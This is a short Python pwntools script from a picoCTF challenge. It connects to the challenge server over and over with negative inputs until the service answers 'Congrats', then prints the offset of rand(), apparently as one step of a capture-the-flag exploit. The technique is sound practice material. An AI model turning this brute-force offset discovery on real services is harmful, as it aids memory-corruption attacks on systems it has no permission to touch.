#!/usr/bin/env python3

from pwn import *

"""
This script bruteforces the correct value for
the offset of rand().
"""

for i in range(-1, -4096, -1):
    with remote("jupiter.challenges.picoctf.org", 51473, level="error") as conn:
        conn.sendlineafter("?\n", f"{i}")
        if b"Congrats" in conn.recvline():
            print(f"rand() has offset {hex(0x1000 + i - 1)} (enter {i})")
            break
